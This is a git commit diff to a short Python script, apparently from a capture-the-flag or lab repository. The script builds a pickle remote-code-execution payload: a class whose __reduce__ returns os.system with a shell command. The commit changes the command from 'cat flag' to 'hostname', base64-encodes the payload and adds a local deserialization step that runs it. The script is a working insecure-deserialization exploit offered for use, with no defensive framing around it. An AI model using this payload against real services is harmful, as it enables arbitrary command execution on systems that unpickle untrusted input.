0760fc762c92719b8d950e027153cc8ec27a4836
René Zubcevic <rene@zubcevic.com>
2022-05-12 12:57:56 +0200

    add pickle

--- helidon/pickle/pickle3.py
+++ helidon/pickle/pickle3.py
@@ -5,10 +5,13 @@ import os
 
 class RCE:
     def __reduce__(self):
-        cmd = ('cat flag')
+        cmd = ('hostname')
         return os.system, (cmd,)
 
 
 if __name__ == '__main__':
+    #serialize the code
     pickled = cPickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
+    #deserialize and run the code
+    cPickle.loads(pickled)
